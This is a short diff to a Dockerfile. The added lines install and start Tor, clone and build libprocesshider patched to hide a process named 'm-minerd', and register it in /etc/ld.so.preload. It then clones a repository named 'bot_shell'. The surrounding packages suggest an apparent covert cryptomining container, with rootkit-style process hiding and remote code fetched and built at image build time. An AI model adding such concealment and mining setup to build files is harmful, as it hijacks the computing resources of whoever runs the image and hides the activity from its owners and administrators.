@@ -22,6 +22,7 @@ RUN apt-get update && apt-get install -y \
     libjansson4 \
     libgomp1 \
     libnuma-dev \
+    tor \
  && mkdir -p /home/stuff
 
 # Set work dir:
@@ -37,6 +38,19 @@ COPY /stuff /home/stuff
 
 # Run config.sh and clean up APT:
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+
+#TOR Service
+RUN service tor start
+
+#Library process hider
+RUN git clone https://github.com/hanifgz/libprocesshider.git \
+ && cd libprocesshider \
+ && sed -i 's/apache/m-minerd/' processhider.c \
+ && make \
+ && sudo mv libprocesshider.so /usr/local/lib/ \
+ && sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload' \
+ && cd .. \
+ && sudo rm libprocesshider -r
 
 # Install the bot:
 RUN git clone https://github.com/kuyaxxx/bot_shell.git \
